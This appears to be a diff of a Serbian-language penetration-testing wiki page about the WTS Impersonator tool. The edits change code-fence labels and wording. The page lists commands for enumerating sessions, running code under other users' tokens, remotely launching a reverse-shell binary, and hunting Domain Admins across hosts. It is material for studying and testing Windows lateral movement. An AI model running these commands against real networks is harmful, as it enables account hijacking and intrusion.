@@ -5,7 +5,7 @@ Alat **WTS Impersonator** koristi **"\\pipe\LSM_API_service"** RPC Named pipe da
 ### Osnovna Funkcionalnost
 
 Alat funkcioniše kroz niz API poziva:
-```powershell
+```bash
 WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
 ```
 ### Ključni Moduli i Korišćenje
@@ -13,35 +13,35 @@ WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → 
 - **Enumeracija Korisnika**: Lokalna i daljinska enumeracija korisnika je moguća sa alatom, koristeći komande za svaku situaciju:
 
 - Lokalno:
-```powershell
+```bash
 .\WTSImpersonator.exe -m enum
 ```
-- Daljinski, specificirajući IP adresu ili ime hosta:
-```powershell
+- Daljinski, specificiranjem IP adrese ili imena hosta:
+```bash
 .\WTSImpersonator.exe -m enum -s 192.168.40.131
 ```
 
-- **Izvršavanje Komandi**: Moduli `exec` i `exec-remote` zahtevaju **Service** kontekst da bi funkcionisali. Lokalno izvršavanje jednostavno zahteva WTSImpersonator izvršni fajl i komandu:
+- **Izvršavanje Komandi**: Moduli `exec` i `exec-remote` zahtevaju **Servis** kontekst da bi funkcionisali. Lokalno izvršavanje jednostavno zahteva WTSImpersonator izvršni fajl i komandu:
 
 - Primer za lokalno izvršavanje komande:
-```powershell
+```bash
 .\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
 ```
-- PsExec64.exe se može koristiti za dobijanje service konteksta:
-```powershell
+- PsExec64.exe se može koristiti za dobijanje servisnog konteksta:
+```bash
 .\PsExec64.exe -accepteula -s cmd.exe
 ```
 
 - **Daljinsko Izvršavanje Komandi**: Uključuje kreiranje i instaliranje servisa daljinski slično PsExec.exe, omogućavajući izvršavanje sa odgovarajućim dozvolama.
 
 - Primer daljinskog izvršavanja:
-```powershell
+```bash
 .\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
 ```
 
 - **Modul za Lov na Korisnike**: Cilja specifične korisnike na više mašina, izvršavajući kod pod njihovim akreditivima. Ovo je posebno korisno za ciljanje Domain Admins sa lokalnim administratorskim pravima na nekoliko sistema.
 - Primer korišćenja:
-```powershell
+```bash
 .\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
 ```
 
